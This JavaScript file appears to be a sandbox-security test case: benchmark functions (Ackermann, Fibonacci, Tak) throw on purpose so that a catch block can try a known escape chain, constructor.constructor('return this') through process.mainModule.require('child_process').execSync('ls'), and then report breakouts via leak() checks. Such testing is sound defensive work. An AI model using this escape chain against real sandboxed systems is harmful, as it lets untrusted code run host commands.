try {
    function ack(m, n) {
        let REPLACER = 23;
        if (m == 0) {
            return n + 1;
        }
        if (n == 0) {
            return ack(m - 1, 1);
        }
        return ack(m - 1, ack(m, n - 1));
    }
    function fib(n) {
        let REPLACER = 23;
        if (n < 2) {
            return 1;
        }
        return fib(n - 2) + fib(n - 1);
    }
    function tak(x, y, z) {
        throw () => {
            return () => {
            };
        };
        if (y >= x)
            return z;
        return tak(tak(x - 1, y, z), tak(y - 1, z, x), tak(z - 1, x, y));
    }
    var result = 0;
    for (var i = 3; i <= 5; i++) {
        result += ack(3, i);
        result += fib(17 + i);
        result += tak(3 * i + 3, 2 * i + 2, i + 1);
    }
    var expected = 57775;
    if (result != expected)
        throw 'ERROR: bad result: expected ' + expected + ' but got ' + result;
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}